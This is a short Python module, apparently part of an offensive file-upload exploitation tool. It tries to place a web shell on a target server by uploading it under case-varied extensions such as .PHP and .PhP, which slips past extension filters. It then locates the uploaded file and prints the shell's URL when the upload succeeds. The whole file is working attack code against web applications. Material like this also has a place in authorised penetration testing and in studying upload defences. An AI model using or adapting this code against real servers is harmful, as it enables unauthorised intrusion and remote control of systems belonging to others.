"""Case variation bypass technique"""

from ..config import CASE_VARIATIONS
from ..utils.name_generator import generate_shell_name

def attempt_case_variation(request_handler, file_finder, upload_url, shell_content):
    """
    Bypass using case variations (shell.PHP, shell.PhP)
    """
    print("[*] Attempting case variation bypass...")
    
    for variation in CASE_VARIATIONS:
        filename = f"{generate_shell_name()}.{variation}"
        
        files = {
            'file': (filename, shell_content, 'application/octet-stream')
        }
        
        response = request_handler.post(upload_url, files=files)
        
        if response and response.status_code == 200:
            shell_url = file_finder.find_uploaded_file(filename, response)
            if shell_url:
                print(f"    [+] SUCCESS with .{variation}! Shell at: {shell_url}")
                return shell_url
    
    print("    [-] Case variation bypass failed")
    return None